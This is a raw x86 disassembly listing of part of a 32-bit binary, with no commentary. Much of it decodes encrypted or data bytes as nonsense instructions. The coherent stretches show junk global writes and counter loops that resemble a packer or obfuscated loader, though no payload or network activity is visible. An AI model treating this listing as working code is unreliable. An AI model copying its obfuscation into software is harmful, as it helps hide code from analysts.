  40db21:	ja     0x40dada
  40db23:	int    0xb2
  40db25:	push   es
  40db26:	dec    eax
  40db27:	adc    BYTE PTR [eax],0x13
  40db2a:	add    BYTE PTR [edx-0x2c],dh
  40db2d:	pop    ebx
  40db2e:	popf   
  40db2f:	outs   dx,DWORD PTR ds:[esi]
  40db30:	test   dh,bh
  40db32:	add    eax,0xe33a59a1
  40db37:	mov    eax,DWORD PTR [edi+0x27bae671]
  40db3d:	ret    
  40db3e:	push   ebx
  40db3f:	cs mov ah,dh
  40db42:	inc    esp
  40db43:	push   0xffffffd5
  40db45:	cmp    dl,BYTE PTR [eax]
  40db47:	xor    esp,edx
  40db49:	lock mov ebx,0xd79d9dba
  40db4f:	retf   0x5da5
  40db52:	inc    ebx
  40db53:	mov    ah,0x55
  40db55:	(bad)  
  40db56:	sar    BYTE PTR [esi-0x14],cl
  40db59:	sbb    DWORD PTR [ecx-0xf],eax
  40db5c:	inc    eax
  40db5d:	stos   BYTE PTR es:[edi],al
  40db5e:	dec    ebp
  40db5f:	pop    esp
  40db60:	into   
  40db61:	shr    BYTE PTR [edi],cl
  40db63:	adc    eax,0x71bcb358
  40db68:	mov    ecx,0xcb77b0c7
  40db6d:	xchg   ebx,eax
  40db6e:	dec    esi
  40db6f:	pop    ss
  40db70:	or     eax,0x6f1f26a
  40db75:	int3   
  40db76:	add    eax,0x2a793039
  40db7b:	jmp    0xfa09:0x4fc0423b
  40db82:	mov    ebp,0x40e61718
  40db87:	pusha  
  40db88:	jl     0x40db91
  40db8a:	lock retf 0x53c8
  40db8e:	cmp    esi,DWORD PTR [ebp+0x6b]
  40db91:	addr16 retf 
  40db93:	test   BYTE PTR [edx-0x42],0x48
  40db97:	test   al,0x41
  40db99:	jle    0x40db88
  40db9b:	dec    edx
  40db9c:	mov    fs,eax
  40db9e:	dec    esp
  40db9f:	mov    bl,0x8a
  40dba1:	xor    DWORD PTR [ecx+0x6fa5b9d1],edi
  40dba7:	jb     0x40db76
  40dba9:	xor    eax,0x7d58c30c
  40dbae:	(bad)  
  40dbaf:	pusha  
  40dbb0:	xor    esi,edi
  40dbb2:	mov    esp,0xc13b679b
  40dbb7:	jne    0x40de3d
  40dbbd:	mov    eax,DWORD PTR [ebp-0x4]
  40dbc0:	xor    eax,edi
  40dbc2:	jmp    0x40de1f
  40dbc7:	mov    edi,0x5dc09dfd
  40dbcc:	loopne 0x40dc31
  40dbce:	adc    DWORD PTR [esi-0x79bfeba4],0xfaab989e
  40dbd8:	sahf   
  40dbd9:	jle    0x40dc59
  40dbdb:	ds jl  0x40dc5c
  40dbde:	jle    0x40dc1e
  40dbe0:	int    0xa9
  40dbe2:	adc    cl,BYTE PTR [ebp+0x43ee7205]
  40dbe8:	mov    edx,0x4904854b
  40dbed:	jb     0x40dbf3
  40dbef:	pop    es
  40dbf0:	(bad)  
  40dbf1:	sub    esi,DWORD PTR [edi+0x36]
  40dbf4:	sub    BYTE PTR [edi-0x40],al
  40dbf7:	xchg   ebp,eax
  40dbf8:	sub    BYTE PTR [edi+0x5f62874a],bl
  40dbfe:	addr16 adc al,ah
  40dc01:	cld    
  40dc02:	popf   
  40dc03:	dec    ebp
  40dc04:	dec    ebx
  40dc05:	inc    ebp
  40dc06:	fadd   QWORD PTR [ecx-0x7987ab72]
  40dc0c:	and    al,0xda
  40dc0e:	and    ah,BYTE PTR [edx+0x1e]
  40dc11:	adc    al,0xc6
  40dc13:	push   eax
  40dc14:	or     DWORD PTR [esi-0x27554799],ebp
  40dc1a:	std    
  40dc1b:	call   0x1f65d589
  40dc20:	scas   al,BYTE PTR es:[edi]
  40dc21:	sbb    BYTE PTR [ebp+0x8b9a8bd],0x65
  40dc28:	out    dx,eax
  40dc29:	inc    edi
  40dc2a:	jo     0x40dc16
  40dc2c:	fisttp WORD PTR [ebx+0x58]
  40dc2f:	jno    0x40dbfd
  40dc31:	out    0x9a,eax
  40dc33:	dec    ebx
  40dc34:	test   eax,0x73118815
  40dc39:	stc    
  40dc3a:	sbb    al,0x5b
  40dc3c:	mov    dl,BYTE PTR [ecx]
  40dc3e:	hlt    
  40dc3f:	xlat   BYTE PTR ds:[ebx]
  40dc40:	push   0x43
  40dc42:	adc    ah,bl
  40dc44:	in     al,dx
  40dc45:	enter  0x3fa6,0x2e
  40dc49:	fist   WORD PTR [ebx-0x75d9384a]
  40dc4f:	jno    0x40dc84
  40dc51:	mov    gs,WORD PTR [esp+eiz*8+0x3df8052c]
  40dc58:	xor    eax,0xf2ca26dd
  40dc5d:	fsub   QWORD PTR [edi-0x26]
  40dc60:	dec    esi
  40dc61:	inc    edx
  40dc62:	retf   0xe975
  40dc65:	or     al,0xfe
  40dc67:	fwait
  40dc68:	jmp    0xc4c32f39
  40dc6d:	xor    eax,0xfaa0f266
  40dc72:	inc    ebx
  40dc73:	jecxz  0x40dc1b
  40dc75:	fld    DWORD PTR [eax]
  40dc77:	fiadd  DWORD PTR [ebp-0x1c393c9a]
  40dc7d:	inc    ebp
  40dc7e:	and    al,0xff
  40dc80:	mov    al,ds:0x7e08ee6
  40dc85:	cmc    
  40dc86:	jbe    0x40dce4
  40dc88:	cs dec ecx
  40dc8a:	adc    bh,ah
  40dc8c:	adc    BYTE PTR [edx],ah
  40dc8e:	push   ss
  40dc8f:	jb     0x40dca3
  40dc91:	sar    BYTE PTR [eax+ebp*2-0x44],0xe7
  40dc96:	repz and DWORD PTR [edx+0x7d5ef198],esp
  40dc9d:	xchg   esi,eax
  40dc9e:	dec    edi
  40dc9f:	shr    esi,0x63
  40dca2:	jmp    0x83621b85
  40dca7:	cli    
  40dca8:	in     eax,0xc2
  40dcaa:	sub    DWORD PTR [eax],eax
  40dcac:	js     0x40dcea
  40dcae:	ja     0x40dc31
  40dcb0:	push   0x63675f08
  40dcb5:	loope  0x40dcb5
  40dcb7:	cmp    BYTE PTR [eax+0x1c0285bb],dl
  40dcbd:	adc    edx,DWORD PTR [ebp-0x7b]
  40dcc0:	loopne 0x40dc70
  40dcc2:	outs   dx,DWORD PTR ds:[esi]
  40dcc3:	fucom  st(1)
  40dcc5:	push   es
  40dcc6:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40dcc7:	iret   
  40dcc8:	push   0xffffffca
  40dcca:	(bad)  
  40dccb:	stc    
  40dccc:	jg     0x40dc71
  40dcce:	and    BYTE PTR [ecx],ch
  40dcd0:	sahf   
  40dcd1:	mov    bl,ah
  40dcd3:	mov    edx,0x7a22c468
  40dcd8:	int3   
  40dcd9:	out    0xc5,al
  40dcdb:	push   ecx
  40dcdc:	test   ch,dh
  40dcde:	sbb    eax,0xc04cd778
  40dce3:	pop    ds
  40dce4:	mov    ah,0x26
  40dce6:	mov    ebx,0x49e7292f
  40dceb:	lods   eax,DWORD PTR ds:[esi]
  40dcec:	ins    DWORD PTR es:[edi],dx
  40dced:	fnsave [eax+0x41df524f]
  40dcf3:	mov    dl,0x11
  40dcf5:	test   BYTE PTR [esi-0x6ee8194b],0xba
  40dcfc:	push   0xffffffcf
  40dcfe:	pop    edx
  40dcff:	push   edi
  40dd00:	adc    dh,BYTE PTR [edi-0x69360bc4]
  40dd06:	sub    ch,bl
  40dd08:	mov    eax,0xed002b7c
  40dd0d:	jo     0x40dd32
  40dd0f:	push   gs
  40dd11:	mov    bh,BYTE PTR [edx]
  40dd13:	hlt    
  40dd14:	ja     0x40dd6b
  40dd16:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40dd17:	fild   DWORD PTR [eax+0x7f]
  40dd1a:	jbe    0x40dd53
  40dd1c:	cmp    eax,0x76ac5452
  40dd21:	cmp    al,0xd0
  40dd23:	lods   eax,DWORD PTR ds:[esi]
  40dd24:	std    
  40dd25:	push   0xb99d1044
  40dd2a:	int    0x39
  40dd2c:	inc    esp
  40dd2d:	or     bl,BYTE PTR [eax+ebp*8-0x456c1503]
  40dd34:	xchg   ecx,eax
  40dd35:	or     cl,ah
  40dd37:	nop
  40dd38:	stc    
  40dd39:	sub    ah,BYTE PTR [eax-0xcc360ca]
  40dd3f:	pop    es
  40dd40:	mov    ds:0x5473048f,eax
  40dd45:	sub    BYTE PTR ds:0x391c00d6,dl
  40dd4b:	sbb    al,0xb6
  40dd4d:	sub    DWORD PTR [ebx],edi
  40dd4f:	push   0xffffffdc
  40dd51:	mov    ds:0x850b4e6,eax
  40dd56:	dec    edx
  40dd57:	popf   
  40dd58:	fucomi st,st(0)
  40dd5a:	pop    esi
  40dd5b:	push   es
  40dd5c:	inc    esp
  40dd5d:	cmp    BYTE PTR [edx+0x59abff4b],dl
  40dd63:	gs xor al,0xaa
  40dd66:	in     al,dx
  40dd67:	sbb    DWORD PTR [esi],ebx
  40dd69:	mov    ecx,DWORD PTR [edx]
  40dd6b:	inc    ebx
  40dd6c:	and    DWORD PTR [esi-0x1],ecx
  40dd6f:	cmp    BYTE PTR [ecx],ch
  40dd71:	imul   edx,DWORD PTR [ecx+0x52bae751],0xffffffe5
  40dd78:	push   0x89ea70cd
  40dd7d:	call   0x1f036663
  40dd82:	aaa    
  40dd83:	xor    al,0x1c
  40dd85:	sub    dh,BYTE PTR [edx]
  40dd87:	xor    al,0x1e
  40dd89:	imul   ebp,DWORD PTR [eax],0xc
  40dd8c:	fmul   st,st(0)
  40dd8e:	inc    edx
  40dd8f:	pop    esp
  40dd90:	cmp    BYTE PTR [eax-0x20665da9],dh
  40dd96:	js     0x40de04
  40dd98:	mov    bl,BYTE PTR [ebx]
  40dd9a:	sbb    DWORD PTR [ecx],edx
  40dd9c:	mov    DWORD PTR [ebp+0x312d3d79],ebp
  40dda2:	pushw  0xecbd
  40dda6:	stc    
  40dda7:	ins    DWORD PTR es:[edi],dx
  40dda8:	test   al,0xd6
  40ddaa:	xchg   DWORD PTR [ebx],edx
  40ddac:	mov    ch,bl
  40ddae:	mov    esi,edi
  40ddb0:	in     eax,dx
  40ddb1:	ss and eax,0x241270f3
  40ddb7:	outs   dx,DWORD PTR ds:[esi]
  40ddb8:	sti    
  40ddb9:	stc    
  40ddba:	jno    0x40dd7e
  40ddbc:	xchg   BYTE PTR [ecx+0x266a8db5],dh
  40ddc2:	fs in  eax,0xd6
  40ddc5:	xchg   DWORD PTR [edx-0x47ee6999],edi
  40ddcb:	(bad)  
  40ddcc:	mov    ebp,0x203f4fd7
  40ddd1:	les    esi,FWORD PTR [ebx-0xe]
  40ddd4:	je     0x40ddcf
  40ddd6:	mov    bl,BYTE PTR [ecx+ebx*4-0x3e]
  40ddda:	xchg   ebx,eax
  40dddb:	pushf  
  40dddc:	push   esp
  40dddd:	xchg   esi,eax
  40ddde:	or     DWORD PTR [ecx],ecx
  40dde0:	int    0x4b
  40dde2:	(bad)  
  40dde3:	adc    DWORD PTR [eax+eiz*8],eax
  40dde6:	scas   al,BYTE PTR es:[edi]
  40dde7:	jns    0x40dd88
  40dde9:	lods   al,BYTE PTR ds:[esi]
  40ddea:	ss sahf 
  40ddec:	mov    ebp,0x30627598
  40ddf1:	dec    ebx
  40ddf2:	push   cs
  40ddf3:	inc    edx
  40ddf4:	cmp    eax,0x506e8568
  40ddf9:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40ddfa:	sar    BYTE PTR [esi],0x4
  40ddfd:	mov    bh,ch
  40ddff:	xor    eax,DWORD PTR [ecx-0x3]
  40de02:	inc    edi
  40de03:	add    ah,BYTE PTR [edi-0x7c]
  40de06:	ret    0xa2c3
  40de09:	adc    eax,0xce56930b
  40de0e:	mov    eax,0xe4a309c6
  40de13:	mov    ebp,0x51aaad94
  40de18:	retf   
  40de19:	cmp    esi,0x5de52d10
  40de1f:	add    eax,esi
  40de21:	mov    ds:0x413bb8,eax
  40de26:	mov    eax,DWORD PTR [ebp-0x4]
  40de29:	xor    eax,edi
  40de2b:	add    eax,esi
  40de2d:	mov    ds:0x413bb0,eax
  40de32:	push   DWORD PTR [ebp-0x8]
  40de35:	push   DWORD PTR [ebp-0x4]
  40de38:	call   0x40de4a
  40de3d:	mov    eax,DWORD PTR [ebp-0x4]
  40de40:	xor    eax,edi
  40de42:	pop    edi
  40de43:	add    eax,esi
  40de45:	pop    esi
  40de46:	leave  
  40de47:	ret    0xc
  40de4a:	push   ebp
  40de4b:	mov    ebp,esp
  40de4d:	sub    esp,0x60
  40de50:	and    DWORD PTR ds:0x43381f,0x0
  40de5a:	mov    eax,ds:0x43381f
  40de5f:	inc    eax
  40de60:	mov    ds:0x43381f,eax
  40de65:	cmp    DWORD PTR ds:0x43381f,0x27
  40de6c:	jne    0x40de7e
  40de72:	push   DWORD PTR [ebp-0xc]
  40de75:	push   DWORD PTR [ebp-0x10]
  40de78:	call   DWORD PTR ds:0x4120e8
  40de7e:	cmp    DWORD PTR ds:0x43381f,0x19
  40de85:	jb     0x40de5a
  40de8b:	xor    DWORD PTR ds:0x43386f,0x6001
  40de95:	jmp    0x40dfce
  40de9a:	push   ecx
  40de9c:	inc    ebp
  40de9d:	jb     0x40df10
  40de9f:	jb     0x40de4a
  40dea1:	icebp  
  40dea2:	fisubr WORD PTR [esi]
  40dea4:	into   
  40dea5:	mul    edi
  40dea7:	jmp    0x7e7e:0x9cbafe36
  40deae:	adc    bh,BYTE PTR [edi+0x7e]
  40deb1:	jle    0x40df21
  40deb3:	aad    0x27
  40deb5:	aaa    
  40deb6:	jg     0x40deec
  40deb8:	aas    
  40deb9:	or     ebp,ebp
  40debb:	ins    DWORD PTR es:[edi],dx
  40debc:	pop    ecx
  40debd:	daa    
  40debe:	sbb    BYTE PTR [edx+0x553586f5],ch
  40dec4:	pop    esi
  40dec5:	sub    eax,0xbfa63bfa
  40deca:	loop   0x40deca
  40decc:	jo     0x40ded8
  40dece:	mov    esp,0xadc04e19
  40ded3:	es loope 0x40df54
  40ded6:	cmp    eax,0xafdf1615
  40dedb:	xchg   DWORD PTR [eax+edi*2],ebp
  40dede:	neg    BYTE PTR [ecx+0x48]
  40dee1:	cli    
  40dee2:	dec    esp
  40dee3:	and    dh,BYTE PTR [eax-0x136c6c87]
  40dee9:	mov    cl,0x1d
  40deeb:	retf   
  40deec:	mov    ?,WORD PTR [esi]
  40deee:	sub    al,BYTE PTR [bx+0x58]
  40def2:	(bad)  
  40def3:	std    
  40def4:	mov    ebx,0x5e9152b3
  40def9:	add    eax,0x9068e199
  40defe:	aas    
  40deff:	cwde   
  40df00:	inc    ah
  40df02:	xor    edi,DWORD PTR [ecx]
  40df04:	leave  
  40df05:	pop    edi
  40df06:	mov    esp,0x72e3272f
  40df0b:	jbe    0x40def7
  40df0d:	(bad)
  40df10:	outs   dx,BYTE PTR ds:[esi]
  40df11:	mov    DWORD PTR [ebp-0x5a],ecx
  40df14:	push   esp
  40df15:	mov    ds:0x971bc09e,al
  40df1a:	cmc    
  40df1b:	jae    0x40df84
  40df1d:	add    eax,0xed6e7027
  40df22:	inc    edi
  40df23:	push   ss
  40df24:	ins    DWORD PTR es:[edi],dx
  40df25:	lods   al,BYTE PTR ds:[esi]
  40df26:	stos   DWORD PTR es:[edi],eax
  40df27:	xor    BYTE PTR [ebx],bh
  40df29:	mov    bl,0xab
  40df2b:	(bad)  
  40df2d:	push   ss
  40df2e:	pop    es
  40df2f:	add    al,0x6b
  40df31:	and    ebx,DWORD PTR [edi-0x56]
  40df34:	push   esp
  40df35:	adc    DWORD PTR [ebp*2+0x6f8c1da],0xaa1b29b3
  40df40:	pop    ecx
  40df41:	imul   esi,DWORD PTR [esp+ecx*8+0x4cd083b0],0xe2023a89
  40df4c:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40df4d:	mov    ah,0x31
  40df4f:	(bad)  
  40df51:	lods   eax,DWORD PTR ds:[esi]
  40df52:	arpl   WORD PTR [ebx+0x37234515],si
  40df58:	cdq    
  40df59:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40df5a:	or     edx,DWORD PTR [edi-0x65]
  40df5d:	stos   DWORD PTR es:[edi],eax
  40df5e:	add    edx,ebx
  40df60:	ffreep st(5)
  40df62:	cmp    eax,0xfe82ed40
  40df67:	fdiv   DWORD PTR ds:0x39aad233
  40df6d:	sbb    ebp,DWORD PTR ds:0x8145ab5d
  40df73:	cmp    DWORD PTR ds:0x77e5e3d8,0xae12d40
  40df7d:	adc    al,0x6f
  40df7f:	nop
  40df80:	mov    DWORD PTR [edx],edi
  40df82:	jle    0x40dfe7
  40df84:	fwait
  40df85:	dec    BYTE PTR [ebp+eiz*1+0x58e29cfd]
  40df8c:	pop    edi
  40df8d:	pop    es
  40df8e:	fist   DWORD PTR [edi-0x7]
  40df91:	add    DWORD PTR [esi-0x5d7dfd24],eax
  40df97:	jbe    0x40dfe5
  40df99:	pop    ebp
  40df9a:	cdq    
  40df9b:	jmp    0x458c6db3
  40dfa0:	test   DWORD PTR [edx-0x21],esp
  40dfa3:	lods   al,BYTE PTR ds:[esi]
  40dfa4:	mov    ebp,0xc5b8e82
  40dfa9:	mov    dh,0xc7
  40dfab:	cs jns 0x40df4e
  40dfae:	xchg   ecx,eax
  40dfaf:	jmp    0x1388dc13
  40dfb4:	add    al,0x95
  40dfb6:	mov    eax,0xc119ee5
  40dfbb:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40dfbc:	test   BYTE PTR [ecx-0x26],dh
  40dfbf:	aas    
  40dfc0:	mov    dh,0x51
  40dfc2:	call   0x7634:0xaa13f46c
  40dfc9:	pop    ebp
  40dfca:	ret    
  40dfcb:	stos   BYTE PTR es:[edi],al
  40dfcc:	out    dx,eax
  40dfcd:	adc    DWORD PTR [ebx+0x2d810845],ecx
  40dfd3:	pop    ss
  40dfd4:	cmp    BYTE PTR [ebx+0x0],al
  40dfd7:	and    eax,0x53000006
  40dfdc:	sub    DWORD PTR ds:0x43386b,0x540f
  40dfe6:	push   esi
  40dfe7:	or     ebx,0x36b6
  40dfed:	mov    esi,0x7510854
  40dff2:	jmp    0x40e12b
  40dff7:	cmp    BYTE PTR [ebx-0x678ee5cf],dh
  40dffd:	shl    DWORD PTR [ecx+0x78],1
  40e000:	xor    esi,ecx
  40e002:	stos   BYTE PTR es:[edi],al
  40e003:	pop    esp
  40e004:	mov    eax,0x9d5eb476
  40e009:	jle    0x40e089
  40e00b:	adc    bh,BYTE PTR [edi+0x7e]
  40e00e:	jle    0x40e074
  40e010:	hlt    
  40e011:	cmp    al,0x92
  40e013:	mov    ebx,0x4790caa2
  40e018:	lea    edi,[edx-0xc]
  40e01b:	or     eax,0x853804d9
  40e020:	mov    ecx,0xd4b6becc
  40e025:	cwde   
  40e026:	fwait
  40e027:	out    dx,al
  40e028:	or     al,0x4a
  40e02a:	addr16 inc esp
  40e02c:	outs   dx,BYTE PTR ds:[esi]
  40e02d:	cli    
  40e02e:	fmul   st,st(6)
  40e030:	or     al,BYTE PTR [esi]
  40e032:	or     DWORD PTR gs:[edx-0x45],ebp
  40e036:	mov    ds:0x99a6d82c,al
  40e03b:	mov    edx,0xa5796388
  40e040:	push   ebp
  40e041:	adc    BYTE PTR [esi-0x2],dh
  40e044:	test   eax,0x603fff8
  40e049:	fs xor al,0xe5
  40e04c:	in     eax,0xc0
  40e04e:	rcr    BYTE PTR [ecx-0x12],0xbc
  40e052:	or     DWORD PTR [edx-0x7328c890],ebp
  40e058:	aad    0x60
  40e05a:	sbb    al,0xec
  40e05c:	mov    ebx,0x1fed0a4e
  40e061:	push   esp
  40e062:	push   0x9df23aed
  40e067:	imul   esp,edi,0xffffffde
  40e06a:	sbb    BYTE PTR [ebp+0x7466d179],bh
  40e070:	stos   DWORD PTR es:[edi],eax
  40e071:	mov    eax,ds:0xae6ea88f
  40e076:	fldcw  WORD PTR [ebp-0x7de618ae]
  40e07c:	stc    
  40e07d:	xor    al,0xa4
  40e07f:	test   al,0xd5
  40e081:	popa   
  40e082:	pop    edi
  40e083:	ds jmp 0x552e:0xf4e67455
  40e08b:	ret    
  40e08c:	mov    cl,0x87
  40e08e:	push   ecx
  40e08f:	cmp    BYTE PTR [edx],dh
  40e091:	mov    WORD PTR [edi],ss
  40e093:	inc    ebp
  40e094:	shl    al,cl
  40e096:	dec    ebp
  40e097:	cmp    BYTE PTR [ecx+0x4d],bh
  40e09a:	int3   
  40e09b:	mov    ds:0xbfd7bec8,eax
  40e0a0:	adc    DWORD PTR [edi+0x32],ecx
  40e0a3:	mov    al,0x96
  40e0a5:	mov    al,0xc8
  40e0a7:	mov    ebp,0xeba06052
  40e0ac:	push   eax
  40e0ad:	aaa    
  40e0ae:	into   
  40e0af:	shl    BYTE PTR [eax-0x11],cl
  40e0b2:	sbb    ah,cl
  40e0b4:	sub    DWORD PTR [ecx],edi
  40e0b6:	cmc    
  40e0b7:	push   esi
  40e0b8:	xor    edi,DWORD PTR [edx+0x2b508f0f]
  40e0be:	and    DWORD PTR [edx],0xfffffff1
  40e0c1:	xor    eax,0x7a06edab
  40e0c6:	adc    DWORD PTR [ecx-0x36],edx
  40e0c9:	imul   edx,ecx,0xefda9acb
  40e0cf:	or     edx,DWORD PTR [ecx-0x2]
  40e0d2:	cdq    
  40e0d3:	and    eax,0xe6b49d3
  40e0d8:	ins    BYTE PTR es:[edi],dx
  40e0d9:	inc    edi
  40e0da:	add    eax,0x24cd33cd
  40e0df:	fcom   st(0)
  40e0e1:	mov    esp,0x3969ceb6
  40e0e6:	xchg   ecx,eax
  40e0e7:	std    
  40e0e8:	xor    dh,BYTE PTR [ecx+0x75eb75c4]
  40e0ee:	jmp    0xf497edbf
  40e0f3:	dec    esp
  40e0f4:	jmp    0x40e168
  40e0f6:	xchg   esi,eax
  40e0f7:	mov    ecx,0x5f9a1fa4
  40e0fc:	jg     0x40e10f
  40e0fe:	mov    dl,0x90
  40e100:	mov    eax,ds:0xb7fc0803
  40e105:	ins    DWORD PTR es:[edi],dx
  40e106:	in     eax,dx
  40e107:	dec    esp
  40e108:	mov    bl,BYTE PTR [esi]
  40e10a:	bnd je 0x40e16a
  40e10d:	call   0x3d8f063f
  40e112:	les    esp,FWORD PTR [edi+0x6b]
  40e115:	lods   al,BYTE PTR ds:[esi]
  40e116:	jecxz  0x40e122
  40e118:	mov    esi,0x4a23756f
  40e11d:	xor    DWORD PTR [edx+0xad4bd03],esp
  40e123:	les    esi,FWORD PTR [esi+0x62]
  40e126:	sbb    al,0x48
  40e128:	jne    0x40e153
  40e12a:	pop    ebp
  40e12b:	xor    eax,esi
  40e12d:	adc    DWORD PTR ds:0x433823,0x2097
  40e137:	mov    ebx,0x32729b
  40e13c:	xor    DWORD PTR ds:0x43386f,0x2259
  40e146:	add    eax,ebx
  40e148:	push   edi
  40e149:	jmp    0x40e282
  40e14e:	pop    ebx
  40e14f:	jecxz  0x40e12d
  40e151:	call   0x71acd2ba
  40e156:	and    ecx,DWORD PTR [eax]
  40e158:	out    0xd3,al
  40e15a:	and    DWORD PTR [ebp-0x658d78b3],edx
  40e160:	jle    0x40e1e0
  40e162:	adc    bh,BYTE PTR [edi+0x7e]
  40e165:	jle    0x40e13f
  40e167:	or     ebx,ebp
  40e169:	pop    esi
  40e16a:	mov    cs,WORD PTR cs:0x71f2d527
  40e171:	lds    esp,FWORD PTR ds:0xe24c057d
  40e177:	lahf   
  40e178:	adc    esp,ebx
  40e17a:	nop
  40e17b:	adc    al,BYTE PTR [edi]
  40e17d:	fcomp  DWORD PTR [esi]
  40e17f:	enter  0xd770,0xff
  40e183:	fdiv   QWORD PTR [ebx]
  40e185:	pop    ecx
  40e186:	mov    bh,BYTE PTR ds:0xea00f263
  40e18c:	bswap  ebp
  40e18e:	adc    eax,0x9d0ea922
  40e193:	loope  0x40e1b0
  40e195:	pop    eax
  40e196:	icebp  
  40e197:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40e198:	in     eax,dx
  40e199:	loope  0x40e14f
  40e19b:	mov    edx,0xc85fb8aa
  40e1a0:	in     eax,0x76
  40e1a2:	mov    bl,0x8f
  40e1a4:	aad    0x8b
  40e1a6:	push   0xaf3ebc62
  40e1ab:	test   al,0xee
  40e1ad:	js     0x40e130
  40e1af:	push   ss
  40e1b0:	push   es
  40e1b1:	or     BYTE PTR [edi-0x41],dh
  40e1b4:	into   
  40e1b5:	and    cl,BYTE PTR [edi+eiz*4-0x23681d51]
  40e1bc:	loope  0x40e193
  40e1be:	bnd jge 0x40e209
  40e1c1:	dec    esi
  40e1c2:	mov    ecx,0x2e526d10
  40e1c7:	cmp    ah,0xb1
  40e1ca:	ins    BYTE PTR es:[edi],dx
  40e1cb:	ror    BYTE PTR [ecx+0xf],cl
  40e1ce:	fnstsw WORD PTR [esi+0x508d426c]
  40e1d4:	shl    BYTE PTR [edi+0x41],1
  40e1d7:	push   esp
  40e1d8:	daa    
  40e1d9:	imul   esi,DWORD PTR [edx],0xffffffed
  40e1dc:	jg     0x40e22c
  40e1de:	push   ebx
  40e1df:	mov    edx,0x621cae6a
  40e1e4:	push   esi
  40e1e5:	aas    
  40e1e6:	inc    eax
  40e1e7:	xchg   esp,eax
  40e1e8:	fbld   TBYTE PTR [eax]
  40e1ea:	ja     0x40e217
  40e1ec:	in     eax,dx
  40e1ed:	mov    ebp,0x9851a4db
  40e1f2:	xchg   ebp,eax
  40e1f3:	daa    
  40e1f4:	jle    0x40e1b2
  40e1f6:	cli    
  40e1f7:	fcmovne st,st(0)
  40e1f9:	push   0x5f75822a
  40e1fe:	pop    esi
  40e1ff:	dec    eax
  40e200:	ffree  st(6)
  40e202:	or     BYTE PTR [ecx-0x80],ch
  40e205:	loop   0x40e196
  40e207:	cmp    DWORD PTR [esi],edx
  40e209:	test   DWORD PTR [ecx+0x22],esp
  40e20c:	je     0x40e28a
  40e20e:	test   BYTE PTR [edi],bh
  40e210:	int    0xb3
  40e212:	jmp    DWORD PTR [ecx+0x6c]
  40e215:	idiv   DWORD PTR [eax+edx*8+0x58c629a2]
  40e21c:	sub    al,0x4a
  40e21e:	inc    esi
  40e220:	xchg   edx,eax
  40e221:	test   eax,0x38e64735
  40e226:	push   eax
  40e227:	jp     0x40e21c
  40e229:	scas   al,BYTE PTR es:[edi]
  40e22a:	add    al,0xc2
  40e22c:	dec    ebp
  40e22d:	jg     0x40e235
  40e22f:	xchg   BYTE PTR [esi+0x48],ch
  40e232:	ret    0xc776
  40e235:	pop    eax
  40e236:	loop   0x40e1d6
  40e238:	out    dx,eax
  40e239:	mov    ds:0x70247fba,al
  40e23e:	jmp    0x6cfbcc25
  40e243:	clc    
  40e244:	cmp    ebx,0x9b077a18
  40e24a:	sbb    BYTE PTR [edx+0x74642f15],bl
  40e250:	xchg   DWORD PTR [edi+0x4a],eax
  40e253:	loopne 0x40e2bd
  40e255:	mov    eax,edi
  40e257:	movs   WORD PTR es:[edi],WORD PTR ds:[esi]
  40e259:	push   0xfffffff7
  40e25b:	lds    esp,FWORD PTR [esi+0x1f]
  40e25e:	jp     0x40e2a0
  40e260:	sub    BYTE PTR [edi+0x7aae030c],al
  40e266:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40e267:	jmp    0xa4ea:0x98895175
  40e26e:	(bad)  
  40e26f:	dec    edi
  40e270:	or     eax,0x85348ab1
  40e275:	mov    ebx,0xedd794f
  40e27a:	jmp    0x40e2d5
  40e27c:	clc    
  40e27d:	mov    al,ds:0x74bc4bcc
  40e282:	mov    DWORD PTR [ebp-0x18],eax
  40e285:	mov    edi,DWORD PTR [ebp+0x8]
  40e288:	inc    DWORD PTR ds:0x43378b
  40e28e:	xor    edi,esi
  40e290:	add    DWORD PTR ds:0x433863,0x2783
  40e29a:	mov    DWORD PTR [ebp-0xc],0xf89c85f1
  40e2a1:	mov    DWORD PTR [ebp-0x10],0xf89c8731
  40e2a8:	dec    DWORD PTR ds:0x4338ab
  40e2ae:	add    edi,ebx
  40e2b0:	mov    DWORD PTR ds:0x433817,0x5e0d
  40e2ba:	jmp    0x40e83c
  40e2bf:	cmp    edi,0x40
  40e2c2:	jne    0x40e31a
  40e2c8:	movzx  eax,BYTE PTR ds:0x43378b
  40e2cf:	mov    eax,ds:0x4139b4
  40e2d4:	mov    eax,DWORD PTR [eax]
  40e2d6:	mov    DWORD PTR ds:0x433857,0x3f94
  40e2e0:	mov    DWORD PTR [ebp-0x14],eax
  40e2e3:	mov    DWORD PTR ds:0x43381f,0x877
  40e2ed:	mov    eax,ds:0x413bbc
  40e2f2:	mov    DWORD PTR ds:0x43379b,0x4b6e
  40e2fc:	mov    eax,DWORD PTR [eax]
  40e2fe:	mov    DWORD PTR ds:0x43389f,0x73ce
  40e308:	mov    DWORD PTR [ebp-0x18],eax
  40e30b:	mov    DWORD PTR ds:0x4338ab,0x7077
  40e315:	jmp    0x40e830
  40e31a:	mov    DWORD PTR ds:0x43385f,0xab2
  40e324:	cmp    edi,0x33d
  40e32a:	mov    DWORD PTR ds:0x43389b,0x48b4
  40e334:	jne    0x40e3b3
  40e33a:	xor    DWORD PTR ds:0x433857,0x79d9
  40e344:	and    DWORD PTR [ebp+0x8],0x0
  40e348:	mov    eax,DWORD PTR [ebp-0x8]
  40e34b:	add    DWORD PTR ds:0x4337d3,0x4337df
  40e355:	sub    eax,DWORD PTR [ebp+0x8]
  40e358:	xor    DWORD PTR ds:0x433827,0x7a28
  40e362:	push   eax
  40e363:	sbb    DWORD PTR ds:0x433853,0x14e6
  40e36d:	mov    eax,DWORD PTR [ebp-0x4]
  40e370:	mov    DWORD PTR ds:0x433857,0x5b5
  40e37a:	add    eax,DWORD PTR [ebp+0x8]
  40e37d:	push   eax
  40e37e:	call   0x4032fa
  40e383:	mov    DWORD PTR ds:0x433783,0x5b4b
  40e38d:	inc    DWORD PTR [ebp+0x8]
  40e390:	cmp    DWORD PTR [ebp+0x8],0x52
